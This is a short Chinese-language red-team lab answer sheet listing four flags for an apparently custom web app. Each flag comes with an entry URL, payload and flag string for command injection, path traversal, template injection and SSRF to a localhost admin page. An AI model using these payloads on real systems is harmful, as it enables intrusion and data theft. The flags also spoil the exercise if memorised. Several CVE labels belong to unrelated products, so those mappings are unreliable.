# Red Team
## 任務
- 透過 4 種不同漏洞找出 4 個 Flag
## 4 個關卡
### 🟢 Flag 1 — Command Injection
- **CVE**：CVE-2026-39808
- **入口**：`http://<IP>:5000/track?id=`
- **Payload**：`;cat /tmp/flag1.txt`
- **Flag**：`FLAG{cmd_injection_cve_2026_39808}`
### 🟡 Flag 2 — Path Traversal
- **CVE**：CVE-2021-41773
- **入口**：`http://<IP>:5000/download?file=`
- **Payload**：`../../tmp/logistics_db.txt`
- **Flag**：`FLAG{path_traversal_cve_2021_41773}`
### 🟠 Flag 3 — SSTI
- **CVE**：CVE-2022-22963
- **入口**：`http://<IP>:5000/greet?name=`
- **Payload**：`{{config}}`
- **Flag**：`FLAG{ssti_cve_2022_22963}`
### 🔴 Flag 4 — SSRF
- **CVE**：CVE-2021-26855
- **入口**：`http://<IP>:5000/fetch?url=`
- **Payload**：`http://127.0.0.1:5000/admin`
- **Flag**：`FLAG{ssrf_cve_2021_26855}`